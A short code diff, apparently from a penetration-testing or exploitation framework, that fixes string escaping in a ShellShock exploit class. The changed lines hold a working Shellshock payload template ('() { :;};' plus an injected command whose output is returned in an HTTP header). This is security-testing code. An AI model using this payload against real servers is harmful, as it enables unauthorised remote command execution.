@@ -171,7 +171,7 @@ class ShellShock(ExploitStrategy):
     # Even after applying the variables above this is a format string which
     # receives the command to run. Note the %%s below:
     PAYLOAD_FMT = '() { :;};PATH=$PATH:%s;%%s | sed "s/$/%s/" | tr -d "\\n\\r"'\
-                  ' | /usr/bin/awk "{print \\"%s: \\"\$0\\"\\n\\"}"'
+                  ' | /usr/bin/awk "{print \\"%s: \\"\\$0\\"\\n\\"}"'
     PAYLOAD_FMT = PAYLOAD_FMT % (PATH, NEW_LINE, INJECTED_HEADER)
 
     def send(self, cmd, opener):
